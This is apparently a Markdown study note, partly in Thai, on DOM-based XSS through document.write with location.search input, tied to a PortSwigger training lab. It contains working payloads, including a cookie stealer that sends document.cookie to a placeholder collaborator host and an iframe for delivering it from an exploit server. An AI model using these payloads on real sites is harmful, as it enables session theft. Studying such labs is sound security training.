# Pattern 2: document.write + location.search
> [Back to Index](../README.md) | [Previous: AngularJS](pattern-1-angularjs.md)

---

## Overview

**Source:** `location.search` (URL query string)
**Sink:** `document.write()` (writes HTML to page)

---

## วิธี Identify

```javascript
// หาใน source code
var search = location.search;
document.write('<select><option value="' + search + '">');

// หรือ
document.write('<img src="/tracker.gif?search=' + searchTerms + '">');
```

**สิ่งที่ต้องหา:**
- `document.write(`
- `location.search`
- ดูว่า input ไปอยู่ใน HTML element อะไร

---

## ทดสอบ

```
/product?productId=1&storeId=fuzzer"></select>fuzzer
```

ดูว่า `">` escape ออกจาก element ได้ไหม

---

## Payload Breakdown

```html
"></select><script>alert(1)</script>
```

| ส่วน | ความหมาย |
|------|----------|
| `">` | ปิด attribute value และ tag ปัจจุบัน |
| `</select>` | ปิด select element |
| `<script>alert(1)</script>` | Inject script |

---

## Payloads

```html
<!-- Basic -->
"></select><script>alert(1)</script>

<!-- Cookie Stealer -->
"></select><script>document.location='https://COLLABORATOR/?c='+document.cookie</script>//
```

---

## Exploit Server Delivery

```html
<iframe src="https://TARGET.net/product?productId=1&storeId=%22%3E%3C/select%3E%3Cscript%3Edocument.location='https://COLLABORATOR/?c='%2bdocument.cookie%3C/script%3E">
</iframe>
```

**URL Encoding:**
| Character | Encoded |
|-----------|---------|
| `"` | `%22` |
| `>` | `%3E` |
| `<` | `%3C` |
| `+` | `%2b` |

---

## Attack Flow

```
1. Attacker หา document.write() ใน source code
         ↓
2. ทดสอบ escape ด้วย ">
         ↓
3. สร้าง payload: "></select><script>...
         ↓
4. URL encode payload
         ↓
5. ใส่ใน iframe บน Exploit Server
         ↓
6. Victim คลิก → Cookie ถูกส่งไป Collaborator
```

---

## Checklist

```
✓ หา document.write() ใน source code
✓ หา location.search หรือ URL input
✓ ดูว่า input อยู่ใน element อะไร (select, input, etc.)
✓ ทดสอบ escape ด้วย ">
✓ สร้าง payload ที่ปิด element แล้ว inject script
✓ URL encode สำหรับ delivery
```

---

## Lab Reference
- [PortSwigger Lab: DOM XSS in document.write sink using source location.search inside a select element](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element)

---

> **Next:** [pattern-3-postmessage-json.md](pattern-3-postmessage-json.md)
